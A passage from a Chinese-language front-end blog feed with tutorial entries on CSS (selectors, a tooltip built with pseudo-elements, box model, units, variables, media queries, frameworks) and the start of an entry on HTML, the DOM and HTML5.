命名風格去客製化少部分樣式</li></ul><h3 id="Utility-First-CSS"><a href="#Utility-First-CSS" class="headerlink" title="Utility-First CSS"></a>Utility-First CSS</h3><ul><li>Tailwind CSS</li><li>Primer</li></ul><p>舉例來說 Primer、Tailwind CSS 主要是縮減大家打字的字數，並且重用基礎的樣式來達到縮減 CSS 體積的效果。</p><p>.mt-1: 對應 margin-top: 0.25rem;<br>.my-2: 對應 margin-top: 0.5rem; margin-bottom: 0.5rem;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.mt-1</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0.25rem</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 易容術入門</title>
      <link href="/2022/09/06/relationships-between-frontend-and-backend/css-introduction/"/>
      <url>/2022/09/06/relationships-between-frontend-and-backend/css-introduction/</url>
      
        <content type="html"><![CDATA[<h2 id="CSS-層疊樣式表"><a href="#CSS-層疊樣式表" class="headerlink" title="CSS 層疊樣式表"></a>CSS 層疊樣式表</h2><p>CSS (Cascading Style Sheets) 層疊樣式表，不像 HTML 一樣是標記語言，也不是標準的程式語言，但在 SCSS、CSS in JS、CSS Module 的出現後也可以用程式語言和架構的角度來看待。</p><p>CSS 就像是女孩子的各種化妝品，將臉上的各個部位進行妝點，網站透過 CSS 易容術後通常會是煥然一新的樣貌。</p><p>CSS 主要會透過 DOM 的選擇器來指定 HTML Element 的外觀樣式，就像是眼影可以指定畫在眼睛口紅會指定畫在嘴唇一樣，CSS 會是影響網站是否美觀的一個重要技術。</p><p>不同的選擇器也會有不同權重，若有衝突的設定，高分則會蓋過低分的選擇器。</p><p>選擇器常見有以下幾種選擇方式:</p><ul><li>ID 選擇器: <code>#elememtID</code> 前面會是 <code>#</code> 且只會指定一個網頁元素，權重最高</li><li>Class 選擇器: <code>.elementClass</code> 前面會是 <code>.</code> 可以指定多個元素，權重次高</li><li>類型選擇器: 指定某種類型的元素，權重普通</li><li>狀態選擇器: 需要跟前三種選擇器配合使用，僅舉例其中兩種<ul><li><code>:hover</code> -&gt; 滑鼠移過</li><li><code>:active</code> -&gt; 被選擇到了</li></ul></li><li>較進階: 選擇同階層相鄰、選擇下層、偽元素</li></ul><p>選擇器也和上妝一樣，後面上的腮紅會蓋掉前面的粉底。</p><p>其中 CSS 權重高的會蓋掉權重低的，權重的部分可以參考 <a href="https://specificity.keegan.st/">CSS 計算機</a>。</p><h3 id="偽元素"><a href="#偽元素" class="headerlink" title="偽元素"></a>偽元素</h3><p>在 <a href="https://codepen.io/cbracco/pen/qzukg">codepen</a> 上看到了一個關於使用偽元素實作 tooltip 簡單又聰明的做法，有用到偽元素跟中括號的選擇器，直接把原作者的原始碼放在底下，真的要我憑空寫還真的寫不出來，覺得好厲害 XD</p><p>比較特別的當然就是在按鈕的自定義了一個屬性 <code>data-tooltip</code>，接著在樣式檔中透過一個中括號的選擇器來找到這個特殊屬性，取值的部分是透過 <code>attr(data-tooltip)</code> 來取。</p><p>偽元素則是 <code>:before</code> 及 <code>:after</code> 透過在 element 的前後透過樣式檔插入元素。</p><p>其實只是一個是直接寫 HTML，另外則是透過這種透過樣式檔來插入。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">data-tooltip</span>=<span class="string">&quot;內容&quot;</span>&gt;</span>按鈕<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Add this attribute to the element that needs a tooltip */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-tooltip]</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Hide the tooltip content by default */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-tooltip]</span><span class="selector-pseudo">:before</span>,</span><br><span class="line"><span class="selector-attr">[data-tooltip]</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">visibility</span>: hidden;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Position tooltip above the element */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-tooltip]</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">160px</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">7px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">180px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#000</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">hsla</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">20%</span>, <span class="number">0.9</span>);</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="built_in">attr</span>(data-tooltip);</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Triangle hack to make tooltip look like a speech bubble */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-tooltip]</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">75px</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border-right</span>: <span class="number">10px</span> solid <span class="number">#000</span>;</span><br><span class="line">  <span class="attribute">border-right</span>: <span class="number">10px</span> solid <span class="built_in">hsla</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">20%</span>, <span class="number">0.9</span>);</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">8px</span> solid transparent;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">8px</span> solid transparent;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot; &quot;</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Show tooltip content on hover */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-tooltip]</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">:before</span>,</span><br><span class="line"><span class="selector-attr">[data-tooltip]</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">visibility</span>: visible;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字型"><a href="#字型" class="headerlink" title="字型"></a>字型</h3><p>因為 safari 跟 chrome 的關係，所以會需要有不一樣的字形，兩種都挑了類似的之後，覺得可以就太天真了。</p><p>作業系統也會影響，會 windows 的 chrome 跟 mac 的字型其實也有點差異，底下是參照網路論壇的，然後拿掉幾個不適用的。</p><p>為什麼會有不適用的出現，因為考慮到中文字以及需要用的特殊字元，各位大大可以自由調換順序，看看結果如何。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: PingFang TC, 黑體-繁, Heiti TC, 蘋果儷中黑, Apple LiGothic Medium, 微軟正黑體,</span><br><span class="line">  Microsoft JhengHei, sans-serif;</span><br></pre></td></tr></table></figure><h2 id="CSS-盒子模型-Box-Model"><a href="#CSS-盒子模型-Box-Model" class="headerlink" title="CSS 盒子模型 (Box Model)"></a>CSS 盒子模型 (Box Model)</h2><p>CSS 盒子模型是描述網頁元素外觀的重要概念，網頁可以看成是小盒子的排列疊加組合。</p><p>Box Model 主要由四個部分主成</p><ul><li>外邊距 (Margin)</li><li>邊框 (Border)</li><li>內邊距 (Padding)</li><li>內容 (Content)</li></ul><p>寬度計算 (box-sizing)</p><ul><li>content-box: 這是預設，只包含內容本身的寬跟高</li><li>border-box: width 和 height 屬性包括內容 (content) 內邊距 (padding) 和邊框 (border)</li></ul><blockquote><p><img src="https://drafts.csswg.org/css2/images/boxdim.png"><br>圖片來源: <a href="https://drafts.csswg.org/css2/#box-model">https://drafts.csswg.org/css2/#box-model</a></p></blockquote><h3 id="長度單位"><a href="#長度單位" class="headerlink" title="長度單位"></a>長度單位</h3><p>樣式檔中，大小有絕對單位與相對單位兩種，其中只有 <code>px</code> 是絕對單位，另外除了行高 (line-height) 可以用純數字 (相對文字大小倍數) 外，大多都會是下面幾種</p><table><thead><tr><th>px</th><th>rem</th><th>em</th><th>%</th><th>vw</th><th>vh</th></tr></thead><tbody><tr><td>絕對</td><td>相對</td><td>相對</td><td>相對</td><td>相對</td><td>相對</td></tr><tr><td>數值</td><td>倍數</td><td>倍數</td><td>百分比</td><td>百分比</td><td>百分比</td></tr><tr><td></td><td>root</td><td>parent</td><td>parent</td><td>螢幕寬度</td><td>螢幕高度</td></tr></tbody></table><p>此外也分享一個我自己都蠻晚才知道的冷知識:</p><blockquote><p>瀏覽器預設 root 的值，等於 16px</p></blockquote><p>這就是為什麼普遍網頁設計會用 8px 或是 8 的倍數當作單位的原因，接下來直接看 bootstrap4 的設定，不難看出都是用 rem 來當作基本單位，透過相對單位，我們可以透過少量的程式碼解決蠻多可能會遇到的問題。</p><ul><li>em 如果只想限制區域比例的問題就可以使用，譬如部落格文章顯示想要調整字體大小</li><li>rem 在 RWD 或是各種版面大小，想整體調整就比較建議用這個</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>,</span><br><span class="line"><span class="selector-class">.h1</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">2.5rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h2</span>,</span><br><span class="line"><span class="selector-class">.h2</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h3</span>,</span><br><span class="line"><span class="selector-class">.h3</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.75rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h4</span>,</span><br><span class="line"><span class="selector-class">.h4</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.5rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h5</span>,</span><br><span class="line"><span class="selector-class">.h5</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.25rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h6</span>,</span><br><span class="line"><span class="selector-class">.h6</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.pt-1</span>,</span><br><span class="line"><span class="selector-class">.py-1</span> &#123;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">0.25rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.pr-1</span>,</span><br><span class="line"><span class="selector-class">.px-1</span> &#123;</span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="number">0.25rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.pb-1</span>,</span><br><span class="line"><span class="selector-class">.py-1</span> &#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">0.25rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.pl-1</span>,</span><br><span class="line"><span class="selector-class">.px-1</span> &#123;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">0.25rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS-變數"><a href="#CSS-變數" class="headerlink" title="CSS 變數"></a>CSS 變數</h3><p>CSS 的變數有區分大小寫，宣告方式就是用 <code>--</code> 開頭 <code>--variable</code> 和 <code>--Variable</code> 會是兩個不同的變數，使用就是透過 <code>var(--variable)</code>，算是蠻直觀的。</p><p>定義全域變數會將變數寫在 <code>:root</code> 裡，建議盡量將變數集中並寫在 CSS 文件的最上面方便後續修改維護。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--primary</span>: <span class="number">#000</span>;</span><br><span class="line">  <span class="attr">--secondary</span>: <span class="number">#003</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--primary);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h2</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--secondary);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS-環境偵測"><a href="#CSS-環境偵測" class="headerlink" title="CSS 環境偵測"></a>CSS 環境偵測</h2><p>既然是樣式檔，那當然也會有環境偵測的功能</p><ul><li>Media Query: 常見的可能就是拿拿來做 RWD</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">600px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>prefers-color-scheme: 用來偵測螢幕的顯示模式</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> (<span class="attribute">prefers-color-scheme</span>: dark) &#123;</span><br><span class="line">  <span class="selector-class">.day</span><span class="selector-class">.dark-scheme</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#333</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.night</span><span class="selector-class">.dark-scheme</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: black;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#ddd</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">prefers-color-scheme</span>: light) &#123;</span><br><span class="line">  <span class="selector-class">.day</span><span class="selector-class">.light-scheme</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: white;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#555</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.night</span><span class="selector-class">.light-scheme</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#eee</span>;</span><br><span class="line">    <span class="attribute">color</span>: black;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>iPhone X Safe Area: iPhone X 把按鈕拔掉後，操作介面底部會出現一條線，滿版螢幕上也會有瀏海，所以蘋果定義了幾個特殊屬性讓大家設定，讓大家可以透過安全顯示範圍的值來控制上下左右是否需要留白</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">padding-bottom</span>: <span class="built_in">constant</span>(safe-area-inset-bottom);</span><br><span class="line"><span class="attribute">padding-bottom</span>: <span class="built_in">env</span>(safe-area-inset-bottom);</span><br></pre></td></tr></table></figure><h2 id="CSS-常見架構"><a href="#CSS-常見架構" class="headerlink" title="CSS 常見架構"></a>CSS 常見架構</h2><p>當交接新專案的時候看到幾千行的樣式檔大概也是這樣的心情，如果還不知道面試前端可以問什麼，歡迎參考:</p><ul><li><a href="https://linyencheng.github.io/2023/01/26/career/what-questions-should-you-ask-the-interviewer/?utm_source=link&utm_medium=article&utm_campaign=internal_link">面試前端，你還有什麼問題想問嗎: 一起透過發問知己知彼找到理想生活 12 個問題</a></li><li><a href="https://open.spotify.com/episode/2ZoETkf4dL6P4ipXKmqcI2">面試前端讓你知己知彼的 10 個問題(上集): 軟體工程師不只是服務業也是良心事業? ft. 資深前端工程師 彥成</a></li></ul><p>CSS 除了相關的基本知識，那 CSS 在架構上有沒有一些方法或是工具來優化呢?</p><p>接下來的幾篇文章會從幾種常見的 CSS 概念、技術、框架來針對 CSS 的架構分別簡單做說明。</p><p>CSS 優化的目標:</p><ol><li>可預測性 (Predictable)</li><li>可重複使用性 (Reusable)</li><li>易維護性 (Maintainable)</li><li>可擴充性 (Scalable)</li></ol><h3 id="CSS-設計模式"><a href="#CSS-設計模式" class="headerlink" title="CSS 設計模式"></a>CSS 設計模式</h3><p>目前在減少 CSS 大小、增加可維護性上有很多方法論，在 Twitter、Facebook 和 GitHub 中的等大型專案中很明顯，但通常一般專案會很快發展為某種幾千行的 CSS 的狀態。</p><p>針對命名上一般會有三個重點:</p><ol><li>看到名字就知道效果</li><li>看到名字就知道用在何處</li><li>看到名字就可以理解結構上的關係</li></ol><p>常見的四種命名原則</p><ul><li>BEM</li><li>OOCSS</li><li>SMACSS</li><li>Atomic CSS</li></ul><h3 id="CSS-Pre-Post-processors-前-後處理器"><a href="#CSS-Pre-Post-processors-前-後處理器" class="headerlink" title="CSS Pre-&#x2F;Post-processors (前&#x2F;後處理器)"></a>CSS Pre-&#x2F;Post-processors (前&#x2F;後處理器)</h3><p>隨著 CSS 開始越來越複雜，由於 CSS 語法受限而發展出了 CSS Pre-&#x2F;Post-processors (預處理和後處理) 來拓展和優化寫法。</p><ul><li>CSS Preprocessor<ul><li>SASS</li><li>Stylus</li><li>less</li></ul></li><li>CSS Postprocessor<ul><li>PostCSS</li></ul></li></ul><h3 id="CSS-Frameworks"><a href="#CSS-Frameworks" class="headerlink" title="CSS Frameworks"></a>CSS Frameworks</h3><ul><li>Pure CSS</li><li>Ant Design</li><li>Bootstrap</li><li>animate.css: 推薦 <a href="https://daneden.github.io/animate.css/">animate.css</a> 也有提供 custom build 的功能</li></ul><h3 id="CSS-in-JS"><a href="#CSS-in-JS" class="headerlink" title="CSS in JS"></a>CSS in JS</h3><ul><li>vanilla-extract</li><li>CSS Modules</li><li>styled Components</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML DOM、HTML5、HTML Template</title>
      <link href="/2022/09/05/relationships-between-frontend-and-backend/html-html5-and-template/"/>
      <url>/2022/09/05/relationships-between-frontend-and-backend/html-html5-and-template/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-HTML"><a href="#什麼是-HTML" class="headerlink" title="什麼是 HTML"></a>什麼是 HTML</h2><p>底下用三句話來說明什麼是 HTML</p><ol><li>HTML (HyperText Markup Language) 是一種基礎技術是 “標記” 語言。</li><li>HTML 透過標記來描述網站應該由哪些元素所構成。</li><li>HTML 常與 CSS、JavaScript 搭配使用於設計網頁、網頁應用、行動應用的使用者介面。</li></ol><p>舉個例子來說，之前看到我朋友在某個狗狗交友軟體的幾個標記:</p><p><code>#學習建立持續不斷的踏實</code> <code>#學著有原則的生活</code><br><code>#喜歡吃火鍋</code> <code>#喜歡吃漢堡</code> <code>#喜歡吃焗烤</code><br><code>#喜劇片</code> <code>#韓劇</code> <code>#慢跑</code> <code>#山林踏青</code><br><code>#棉花糖</code> <code>#吳汶芳</code> <code>#白安</code> <code>#五月天</code> <code>#八三夭</code><br><code>#喜歡讀非專業和文學以外的書</code></p><p>透過標記就會快速的知道這個人的組成會是什麼樣子，但也許看不太出來長相以及該怎麼進行互動。</p><p>同樣的，只有 HTML 的網頁就會像是素顏的女孩子一樣，很可能化過妝後就變成另外一個截然不同的樣貌，而化妝就是 CSS 的功用。</p><p>網頁瀏覽器透過讀取 HTML 檔案，並依照 DOM 的規範將其 render 成網頁，JavaScript 則透過操作 DOM tree 中的節點來達到與使用者進行互動的目的。</p><h3 id="DOM-文件物件模型"><a href="#DOM-文件物件模型" class="headerlink" title="DOM 文件物件模型"></a>DOM 文件物件模型</h3><p>HTML 是透過<strong>文件物件模型（Document Object Model, DOM）</strong>這種結構化表示法來描述網頁，透過 DOM 的收納管理規範來整理和存取。</p><p>以看妹來說，我們會很快掃過臉、三圍、腿、化妝、穿著，並依照分類快速的尋找想要注意的亮點。</p><p>DOM tree 就是為了幫助我們了解物件節點之間的關係，並提供程式改變和存取網頁中的物件的方法。</p><p>此外 DOM tree 節點也可以附加事件處理程序，一旦觸發事件就會執行處理程序，網頁就能與程式語言連結在一起。</p><p>底下這個網站是 Live Dom Viewer 推薦大家玩看看。</p><iframe width="560" height="315" src="https://software.hixie.ch/utilities/js/live-dom-viewer/" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><blockquote><p><a href="https://software.hixie.ch/utilities/js/live-dom-viewer/">https://software.hixie.ch/utilities/js/live-dom-viewer/</a></p></blockquote><h3 id="HTML-vs-HTML5"><a href="#HTML-vs-HTML5" class="headerlink" title="HTML vs HTML5"></a>HTML vs HTML5</h3><p>HTML5 是由全球資訊網協會 (W3C) 制定的 HTML 最新修訂版本標準，目標是取代 1999 年的 HTML 4.01 和 XHTML 1.0，在網際網路應用 (PWA) 迅速發展時，網路標準也能符合當代網路需求。</p><p>目前 <a href="https://html.spec.whatwg.org/multipage/">HTML5 會是 Living Standard</a> 也就是說近年不會再出現 HTML 6。</p><p><strong>Project Fugu</strong> 這個網站記錄了 Chrome 團隊即將開發的新功能和潛在功能的完整列表，M$ 也將新的 edge 底層抽換成 <strong>Chromium</strong> 原則上 PWA 接下來的發展是值得繼續期待的。</p><p><a href="https://fugu-tracker.web.app/">https://fugu-tracker.web.app/</a></p><p>HTML5 可以想像成目前日韓流行的一些標準，這些標準會受到萬千少女的模仿和追逐，像是日韓系的裝扮、日韓系的飲食、日韓系的電器都會逐漸進入到我們生活的一環。</p><p>底下列出幾個 HTML5 的酷炫功能:</p><ul><li><a href="https://linyencheng.github.io/2021/09/10/progressive-web-application/pwa-badging-for-app-icon/?utm_source=link&utm_medium=article&utm_campaign=internal_link">通知數字 (Badging API)</a></li><li><a href="https://linyencheng.github.io/2021/09/15/progressive-web-application/pwa-geo-location-api/?utm_source=link&utm_medium=article&utm_campaign=internal_link">位置存取 (Geo Location API)</a></li><li><a href="https://linyencheng.github.io/2021/09/19/progressive-web-application/pwa-web-nfc/?utm_source=link&utm_medium=article&utm_campaign=internal_link">NFC Reader</a></li><li><a href="https://linyencheng.github.io/2021/09/20/progressive-web-application/pwa-wake-lock/?utm_source=link&utm_medium=article&utm_campaign=internal_link">喚醒鎖維持螢幕長亮</a></li><li><a href="https://linyencheng.github.io/2021/09/21/progressive-web-application/pwa-web-share/?utm_source=link&utm_medium=article&utm_campaign=internal_link">分享內容 (Web Share API)</a></li><li><a href="https://linyencheng.github.io/2021/09/22/progressive-web-application/pwa-contact-picker/?utm_source=link&utm_medium=article&utm_campaign=internal_link">存取通訊錄 (Contact Picker API)</a></li><li><a href="https://linyencheng.github.io/2021/09/23/progressive-web-application/pwa-background-sync/?utm_source=link&utm_medium=article&utm_campaign=internal_link">定期背景同步 (Periodic Background Sync API)</a></li><li><a href="https://linyencheng.github.io/2021/09/24/progressive-web-application/pwa-idle-detection/?utm_source=link&utm_medium=article&utm_campaign=internal_link">裝置閒置偵測 (Idle Detection API)</a></li><li><a href="https://linyencheng.github.io/2021/09/25/progressive-web-application/pwa-notification/?utm_source=link&utm_medium=article&utm_campaign=internal_link">顯示通知 (Notification API)</a></li><li><a href="https://linyencheng.github.io/2021/10/02/progressive-web-application/pwa-app-shortcuts/?utm_source=link&utm_medium=article&utm_campaign=internal_link">程式快速啟動選單 (App Shortcut)</a></li></ul><h3 id="HTML-多國語系"><a href="#HTML-多國語系" class="headerlink" title="HTML 多國語系"></a>HTML 多國語系</h3><p>HTML 提供了 <code>lang</code> 這個屬性可以指定節點的語系，這個標記對於區域搜尋有加分效果，舉例來說想在台灣地區易被搜尋就可以</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-TW&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span 